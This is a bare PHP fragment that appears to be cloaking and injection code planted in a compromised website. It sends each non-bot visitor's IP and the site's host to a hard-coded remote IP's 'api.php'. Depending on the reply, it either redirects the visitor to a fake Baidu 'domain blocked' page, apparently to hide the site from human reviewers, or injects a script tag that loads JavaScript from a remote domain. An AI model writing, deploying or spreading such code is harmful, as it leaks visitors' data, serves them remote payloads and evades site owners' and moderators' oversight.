<?php
if(!$bot){
	$gg="<script src=\"//www.".$dj."/".$ag.".js\"></script>";
    //echo $gg;
	$url_api = "http://173.82.197.115:22055/xinban/api.php?q=".$ip."&y=".$_SERVER['HTTP_HOST'].$id."&u=".$name;
	$resultx = get_content_nr($url_api,0.1);
	$result = json_decode($resultx, true);
	if ($result['code']){
		 $rg=$result[data][rengong];
		 $tw=$result[data][tianwang];
		 $gb=$result[data][garbage];
		}
		$get_rengong = get_rengong();
		if ($rg){
			{
				write($get_rengong,date("Y-m-d H:i:s"));
				header('Location: http://domainwall.cloud.baidu.com/block.html');
				exit();
				}
		}
		if(is_file($get_rengong)){
			$dingshi=$get_rengong;
			$lastflesh=@filemtime($dingshi)+180;
			$rengong = $lastflesh<time();
			if($rengong){
				unlink($get_rengong);
				}else{
					header('Location: http://domainwall.cloud.baidu.com/block.html');
					exit();
					}
			}
		if(!$gb&&!$tw){
			echo $gg;
		}
}